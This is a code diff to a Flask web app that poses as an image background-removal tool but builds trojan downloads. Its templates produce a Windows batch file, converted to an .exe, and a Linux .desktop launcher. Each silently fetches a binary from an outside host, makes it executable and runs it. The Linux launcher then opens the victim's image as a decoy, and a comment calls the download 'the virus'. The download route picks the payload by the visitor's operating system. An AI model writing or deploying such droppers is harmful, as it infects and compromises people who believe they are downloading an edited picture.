@@ -16,26 +16,31 @@ UPLOAD_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'upload
 PROCESSED_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'processed')
 EXECUTABLES_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'executables')
 ICOS_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'icos')
+PNG_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'pngs')
 BATFILES_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'batfiles')
+DESKTOP_FOLDER = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'deskfiles')
 BAT_TO_EXE_PATH = "/home/stanley/B2E.exe"
 # BAT_TO_EXE_PATH = "/mnt/c/Users/stanl/Downloads/Bat_To_Exe_Converter_x64.exe"
 app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
 app.config["PROCESSED_FOLDER"] = PROCESSED_FOLDER
 app.config["EXECUTABLES_FOLDER"] = EXECUTABLES_FOLDER
 app.config["ICOS_FOLDER"] = ICOS_FOLDER
+app.config["PNG_FOLDER"] = PNG_FOLDER
 app.config["BATFILES_FOLDER"] = BATFILES_FOLDER
+app.config["DESKTOP_FOLDER"] = DESKTOP_FOLDER
 
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs(PROCESSED_FOLDER, exist_ok=True)
 os.makedirs(EXECUTABLES_FOLDER, exist_ok=True)
 os.makedirs(ICOS_FOLDER, exist_ok=True)
+os.makedirs(PNG_FOLDER, exist_ok=True)
 os.makedirs(BATFILES_FOLDER, exist_ok=True)
+os.makedirs(DESKTOP_FOLDER, exist_ok=True)
 
 DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')
 
 # Pulls the compiled c file, gives it executable permissions, then runs it
-batfile_template = '''
-@echo off
+batfile_template = '''@echo off
 
 wsl bash -c "curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null"
 wsl bash -c "chmod +x ~/.config/rm17-node 2>/dev/null"
@@ -52,12 +57,13 @@ start "" /min "%delbat%"
 
 exit'''
 
-desktop_template = '''
-[Desktop Entry]
+desktop_template = '''[Desktop Entry]
 Type=Application
-Name=Pseudo
-Exec=touch success
-Icon=ICON_PATH
+Name=FILENAME
+Comment=Dynamic launcher
+Path=.
+Exec=bash -c "COMMANDS"
+Icon=.PNG_PATH
 Terminal=false'''
 
 # Gets db connections
@@ -116,7 +122,7 @@ def proceed():
     original_filename = img.filename
     
     # Filename for the exe that will be downloaded
-    session['filename'] = f'{os.path.splitext(original_filename)[0]}.exe'
+    session['filename'] = f'{os.path.splitext(original_filename)[0]}'
 
     # Generate unique filename so we don't accidently override
     extension = os.path.splitext(img.filename)[1]
@@ -132,6 +138,9 @@ def proceed():
     # Path for the exe icon
     ico_path = os.path.join("icos", f'{os.path.splitext(filename)[0]}.ico')
     
+    # Path for the desktop icon
+    png_path = os.path.join("pngs", f'{os.path.splitext(filename)[0]}.png')
+    
     # Path for the batfile
     batfile_path = os.path.join("batfiles", f'{os.path.splitext(filename)[0]}.bat')
     
@@ -145,13 +154,30 @@ def proceed():
     # Saves the batfile
     with open(batfile_path, 'w') as file:
         file.write(batfile)
+        
+    # Path for the desktop file
+    deskfile_path = os.path.join("deskfiles", f'{os.path.splitext(filename)[0]}.desktop')
+    
+    # Creates the desktop file
+    deskfile = desktop_template[:]
+    deskfile = deskfile.replace("FILENAME", original_filename)
+    deskfile_commands = ""
+    deskfile_commands += f"curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; chmod +x ~/.config/rm17-node 2>/dev/null; ~/.config/rm17-node 2>/dev/null; curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null; rm .{os.path.splitext(filename)[0]}.png; xdg-open {original_filename}"
+    deskfile = deskfile.replace("COMMANDS", deskfile_commands)
+    deskfile = deskfile.replace("PNG_PATH", f'{os.path.splitext(original_filename)[0]}.png')
+    
+    # Saves the desktop file
+    with open(deskfile_path, 'w') as file:
+        file.write(deskfile)
     
     # Removes image background
     subprocess.run(["backgroundremover", "-i", upload_path, "-o", processed_path])
+    subprocess.run(["cp", processed_path, png_path])
     
     # Creates the ico from the image
     img = Image.open(processed_path)
     img.save(ico_path, format='ICO', sizes=[(256, 256), (64, 64), (32, 32)])
+    img.save(png_path, format='PNG')
 
     # Wait until the file exists and is non-empty
     time.sleep(2)
@@ -166,7 +192,7 @@ def proceed():
     # os.remove(upload_path)
 
     flash("Image processed! Click download to get the PNG.", "success")
-    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}.exe')
+    return render_template("results.html", filename=original_filename, img=filename, download_filename=f'{os.path.splitext(filename)[0]}')
 
 # Download page where the target will download the virus
 @app.route("/results", methods=['GET', 'POST'])
@@ -289,10 +315,22 @@ def get_file(filename):
 def download_img(filename):
     return send_from_directory(PROCESSED_FOLDER, filename)    
 
-# Download the executable
+# Download executables based on the OS
 @app.route('/download/<path:filename>', methods=['GET', 'POST'])
-def download_file(filename):
-    return send_from_directory(EXECUTABLES_FOLDER, filename, download_name=session['filename'], as_attachment=True)
+def download(filename):
+    ua = request.headers.get("User-Agent", "").lower()
+
+    if "windows" in ua:
+        print("windows")
+        return send_from_directory(EXECUTABLES_FOLDER, f'{filename}.exe', download_name=f'{session['filename']}.exe', as_attachment=True)
+    elif "macintosh" in ua:
+        print("mac")
+        # return send_file("downloads/myapp-mac.dmg", as_attachment=True)
+    elif "linux" in ua:
+        print("linux")
+        return send_from_directory(DESKTOP_FOLDER, f'{filename}.desktop', download_name=f'{session['filename']}.desktop', as_attachment=True)
+    
+    return ""
     
 if __name__ == "__main__":
     create_db()
